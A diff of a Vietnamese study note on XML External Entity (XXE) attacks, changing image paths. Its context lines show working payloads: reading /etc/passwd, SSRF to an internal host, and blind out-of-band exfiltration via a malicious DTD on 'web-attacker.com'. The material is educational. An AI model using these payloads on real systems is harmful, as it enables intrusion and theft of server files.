@@ -4,7 +4,7 @@
 Lỗ hổng tấn công chèn thực thể bên ngoài XML (còn được gọi là XXE) là lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào quá trình xử lý dữ liệu XML của ứng dụng.
 Cho phép kẻ tấn công xem các tệp trên hệ thống và thực thi 
 Kẻ tấn công có thể leo thang đặc quyền để xâm phạm máy chủ hoặc cơ sở hạ tầng phụ trợ khác bằng cách lợi dụng XXE để tấn công giả mạo máy chủ SSRF.
-![alt text](image.png)
+![alt text](./HinhAnh/image.png)
 ## Các lỗ hổng XXE phát sinh như thế nào và ra sao?
 Các thực thể bên ngoài XML là thực thể được tùy chỉnh định nghĩa và chúng được tải lên ở bên ngoài được gọi là `DTD` nơi chúng được khai báo. Nó cho phép định nghĩa thực hiện nội dung của đường dẫn tệp hoặc URL
 ## Các loại tấn công XXE là gì
@@ -34,7 +34,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ...
 ```
 ## Khai thác lỗ hổng XXE để thực hiện các cuộc tấn công SSRF
-![alt text](image-1.png)
+![alt text](./HinhAnh/image-1.png)
 ```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
 ```
@@ -64,10 +64,10 @@ Payload SVG:
 </svg>
 ```
 ## Các cuộc tấn công XXE thông qua loại nội dung đã sửa đổi
-![alt text](image-2.png)
+![alt text](./HinhAnh/image-2.png)
 Và nếu ứng dụng chấp nhận yêu cầu chưa XML có thể thực hiện cuộc tấn công XXE
 ## Cách tìm và kiểm tra các lỗ hổng XXE
-![alt text](image-3.png)
+![alt text](./HinhAnh/image-3.png)
 ## Tìm kiếm và khai thác các lỗ hổng XXE ẩn
 ### XXE mù là gì?
 Lỗ hổng XXE mù phát sinh khi ứng dụng dễ bị tấn công bằng phương pháp chèn XXE nhưng không trả về giá trị của bất kỳ thực thể bên ngoài nào được định nghĩa trong phản hồi.
@@ -99,7 +99,7 @@ Bằng cách này chúng ta có thể sử dụng thực thể XML nhưng thực
 ```
 Đoạn mã tấn công XXE này khai báo một thực thể tham số XML có tên `xxe` và sau đó sử dụng thực thể đó trong DTD. Điều này sẽ gây ra việc tra cứu DNS và yêu cầu HTTP đến miền của kẻ tấn công, xác minh rằng cuộc tấn công đã thành công.
 ## Khai thác lỗ hổng XXE ẩn để đánh cắp dữ liệu ngoài băng tần
-![alt text](image-4.png)
+![alt text](./HinhAnh/image-4.png)
 Một đoạn DTD độc hại nhằm đánh cắp nội dung của `/etc/passwd` 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -121,7 +121,7 @@ Cuối cùng, kẻ tấn công phải gửi đoạn mã XXE sau đến ứng d�
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
 ```
 Đoạn mã tấn công XXE này khai báo một thực thể tham số XML có tên xxevà sau đó sử dụng thực thể đó trong DTD. Điều này sẽ khiến trình phân tích cú pháp XML lấy DTD bên ngoài từ máy chủ của kẻ tấn công và diễn giải nó trực tiếp. Các bước được định nghĩa trong DTD độc hại sau đó được thực thi và tệp `/etc/passwd` được truyền đến máy chủ của kẻ tấn công.
-![alt text](image-5.png)
+![alt text](./HinhAnh/image-5.png)
 ## Khai thác lỗ hổng XXE ẩn để lấy dữ liệu thông qua thông báo lỗi.
 Một cách tiếp cận khác để khai thác lỗ hổng XXE ẩn là tạo ra lỗi phân tích cú pháp XML, trong đó thông báo lỗi chứa dữ liệu nhạy cảm mà bạn muốn lấy. Điều này sẽ hiệu quả nếu ứng dụng trả về thông báo lỗi đó trong phản hồi của nó.
 Bạn có thể kích hoạt thông báo lỗi phân tích cú pháp XML chứa nội dung của `/etc/passwd` tệp bằng cách sử dụng DTD bên ngoài độc hại như sau:
@@ -132,4 +132,5 @@ Bạn có thể kích hoạt thông báo lỗi phân tích cú pháp XML chứa 
 %error;
 ```
 DTD thực hiện các bước như phần trên.
-## Khai thác lỗ hổng XXE ẩn bằng cách tái sử dụng DTD cục bộ
+
+
